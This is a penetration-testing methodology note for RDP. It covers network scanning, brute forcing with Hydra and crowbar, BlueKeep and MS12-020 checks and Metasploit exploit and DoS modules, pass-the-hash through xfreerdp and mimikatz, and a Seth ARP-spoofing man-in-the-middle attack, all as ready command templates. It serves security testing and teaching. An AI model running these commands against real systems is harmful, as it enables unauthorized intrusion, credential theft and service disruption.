# RDP - Methodology

### Overview

The `Remote Desktop Protocol (RDP)` is a proprietary protocol developed by
Microsoft, which provides a user with a graphical interface to connect to
another computer over a network connection. The user employs `RDP` client
software for this purpose, while the other computer must run a `RDP` server
software.

`RDP` authentication mechanism rely on Windows local or Active Directory domain
credentials.

###### Network Level Authentication NLA

`RDP` may uses `Network Level Authentication (NLA)`, introduced in `RDP 6.0`
and supported initially in Microsoft Windows Vista / Windows Server 2008, which
requires the connecting user to authenticate before a session is established
with the server and prevents the use of resources on the server from the load
of the graphical login screen.

###### Restricted Admin mode

The `Restricted Admin mode` is a security feature introduced in the Microsoft
Windows 8.1 and Server 2012 R2 operating systems. The feature has been
backported to Windows 7 and Server 2008.

`Restricted Admin mode` prevents the connecting user's credentials to be stored
on the remote host by transforming the logon to a `network logon` (`Type 3`)
instead of a `remote interactive logon` (`Type 10`). Indeed, for
`remote interactive logon`, the plaintext password is provided and the user's
credentials are stored in the `LSASS` process of the remote host. In
`Restricted Admin mode`, no form of credentials (plaintext password, `LM` /
`NTLM` hashes or `kerberos` `TGT`) are stored on the remote host.

`Restricted Admin mode` must be enabled on the remote host
(`DisableRestrictedAdmin` registry key to (`REG_DWORD`) `0` which is not the
case by default) and the client must connect in `Restricted Admin mode` (for
example: `mstsc.exe /restrictedAdmin`). Note that enabling `Restricted Admin
mode` allow `Pass-the-hash` authentication over `RDP`.

Only members of the local `Administrators` group may authenticate in
`Restricted Admin` mode and the network identity (for remote access over the
network) of the `RDP` session will, by default, be authenticated using the
`RDP` host machine account. This authentication using the `RDP` host machine
account can be disabled by setting the `DisableRestrictedAdminOutboundCreds`
registry key to (`REG_DWORD`) `1`.

### Network scan

`Nmap` and the `Metasploit`'s `auxiliary/scanner/rdp/rdp_scanner` module can be
used to scan the network for `RDP` services.

`Nmap`'s service and default `RDP` scripts scan may allow for the retrieval of
information about the hosts (`NetBIOS` / `DNS` hostname, Windows product
version, `SSL` / `TLS` subject and issuer, etc.). `Metasploit`'s
`auxiliary/scanner/rdp/rdp_scanner` module will check whether or not `NLA` is
enabled.

```
nmap -n -Pn -v -p 3389 -sV -sC -oA <NMAP_OUTPUT> <RANGE | CIDR>

msf > use auxiliary/scanner/rdp/rdp_scanner
msf auxiliary(scanner/rdp/rdp_scanner) > set RHOSTS <HOSTNAME | IP | CIDR | file:<PATH>>
```

### Authentication brute force

The local or Active Directory domain account lockout policies apply
(depending on the type of authentication tried) when connecting in `RDP`.
Vertical brute forcing may thus not be possible.

However, horizontal `RDP` brute forcing can be used for lateral movement once
an account has been compromised. Indeed, the compromised account may not be a
member of the local `Administrators` group (and thus can not connect through
`PsExec` like tool for example) but can be a member of the `Remote Desktop
Users` group.

`Patator`, `Hydra` or the `crowbar` Python Script can be used to brute force
`RDP` access. `Patator` and `crowbar` both support `NLA` (as of December 2018,
`Hydra` does not support no NLA RDP brute force).

```
python crowbar.py -b rdp (-u <USERNAME | <DOMAIN\\USERNAME> | -U USERNAME_FILE) (-c <PASSWORD> | -C <PASSWORDS_LIST) -s <CIDR>

hydra -t 1 -V -l <USERNAME> (-p <PASSWORD> | -P <PASSWORDS_LIST) rdp://<IP | HOST>
```

### Known vulnerabilities

`nmap` can be used to check for the `CVE-2012-0002` / `MS12-020` exploit.
The `Metasploit`'s `auxiliary/scanner/rdp/cve_2019_0708_bluekeep` module and
`rdpscan` can be used to scan for `BlueKeep` / `CVE-2019-0708`.

```
# BlueKeep CVE-2019-0708
msf> use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
# set RHOSTS file:<PATH>
# set THREADS <THREADS_NUMBER>

rdpscan.exe --file E:\Keolis\1-Wales\1-Pentest\hosts\IP.txt

# CVE-2012-0002 / MS12-020
nmap -v -p 3389 --script rdp-vuln-ms12-020 <HOST>
msf> use auxiliary/scanner/rdp/ms12_020_check
```

###### BlueKeep CVE-2019-0708

An heap corruption can occur in the RDP protocol that allows for arbitrary code
execution at the system level pre-authentication.

Microsoft identified the following Windows versions as vulnerable:
  - Windows XP
  - Windows Vista
  - Windows 7
  - Windows Server 2003
  - Windows Server 2008
  - Windows Server 2008 R2

Windows versions newer than Windows 7 and Windows Server 2012 are not vulnerable.

The `Metasploit` module `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` can be
used to exploit the vulnerability. Note that the exploit is not yet polished.

```
msf> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

###### CVE-2012-0002 / MS12-020

The `CVE-2012-0002` / `MS12-020` vulnerability can be used both to realize a
Denial Of Service and remotely execute code on the target.

The `Metasploit`'s `auxiliary/dos/windows/rdp/ms12_020_maxchannelids` may be
used to realize a `DoS` of the target:

```
msf> use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
```

As of December 2018, no public proof-of-concept code that results in remote
code execution is available.

### RDP clients

###### Windows

On Windows, the default `Microsoft Remote Desktop` (`mstsc.exe`) application
("Connexion Bureau à distance") or the `Remote Desktop Manager` and `mRemoteNG`
third parties applications can be used as `RDP` clients.

The `Remote Desktop Manager` and `mRemoteNG` clients allow for the
configuration and storing of multiples `RDP` connections (host and
authentication information). A free edition of `Remote Desktop Manager` is
available as well as a commercial grade enterprise edition.

###### Linux

On Linux, `FreeRDP` (`xfreerdp`), `rdesktop` or `Remmina` (GUI) can be used as
`RDP` clients.

```
xfreerdp [/size:<SCREEN_SIZE_PERCENT>%] /u:'<DOMAIN | WORKGROUP>\<USERNAME>' /p:'<PASSWORD>' /v:<HOSTNAME | IP>[:<PORT>]
# No NLA for host that do not require NLA.
xfreerdp -sec-nla /v:<HOSTNAME | IP>
xfreerdp -sec-nla /u:'<DOMAIN | WORKGROUP>\<USERNAME>' /p:'<PASSWORD>' /v:<HOSTNAME | IP>
# Restricted admin mode.
xfreerdp /restricted-admin /u:'<DOMAIN | WORKGROUP>\<USERNAME>' /p:'<PASSWORD>' /v:<HOSTNAME | IP>

rdesktop -d '<DOMAIN | WORKGROUP>' -u '<USERNAME>' <HOSTNAME | IP>[:<PORT>]

Remmina
```

### Pass-the-hash over RDP

The `xfreerdp` client on Linux and `mimikatz` with the built-in `mstsc.exe`
client on Windows can be used to authenticate using an account's `NTLM` hash
through `RDP`. The remote hosts must support the `Restricted Admin mode`
feature.

```
# Linux.
xfreerdp /u:'<DOMAIN | WORKGROUP>\<USERNAME>' /pth:<HASH> /v:<HOSTNAME | IP>

# Windows.
# The Remote Desktop Connection (mstsc.exe) client will display the currently logged user information but the network connection will be established using the identity specified to mimikatz's sekurlsa::pth.  
sekurlsa::pth /domain:<. | DOMAIN_FQDN> /user:<USERNAME> /ntlm:<NT_HASH> /run:"mstsc.exe /restrictedadmin"
```

### Man-in-the-middle attack

`Seth` is a tool written in Python and Bash to MitM `RDP` connections that
attempts to downgrade the connection in order to extract clear text credentials.

`Seth` can be used regardless if `Network Level Authentication (NLA)` is
enabled or not on the targeted `RDP` host.

`Seth` will notably:
  - Spoof `ARP` replies to redirect traffic from the victim host to the
    attacker machine and then to the target RDP server.
  - Configure an `iptable` rule to reject `SYN` packet to prevent direct `RDP`
    authentication.
  - Clone the `SSL` certificate (only replacing the public key and signature)
  - Block traffic to port 88 to downgrade `Kerberos` authentication to `NTLM`.

Note that the user will be presented with a certificate error warning that must
be accepted before the clear text credentials are sent.

In case of a successful attack:

  - Clear text credentials of the user login in are obtained
  - A command can be executed on the targeted host
  - Victim keyboard inputs are retrieved

```
# Unless the RDP host is on the same subnet as the victim machine, the last IP address must be that of the gateway.
# The COMMAND is executed on the RDP host by simulating WIN+R
# The COMMAND should not contains special characters (powershell -enc <STRING> can be used)

seth.sh <INTERFACE> <ATTACKER_IP> <VICTIM_IP> <GATEWAY_IP | HOST_IP> [<COMMAND>]
```

### Session Hijacking

If `Administrator` / `NT AUTHORITY\SYSTEM` privileges could be obtained on a
host, `RDP` sessions of others users can be hijacked. This could be used to
access the host as the hijacked user through a GUI interface with out knowing
its password.  

To hijack `RDP` session refer to the `[Windows] Post Exploitation` note.
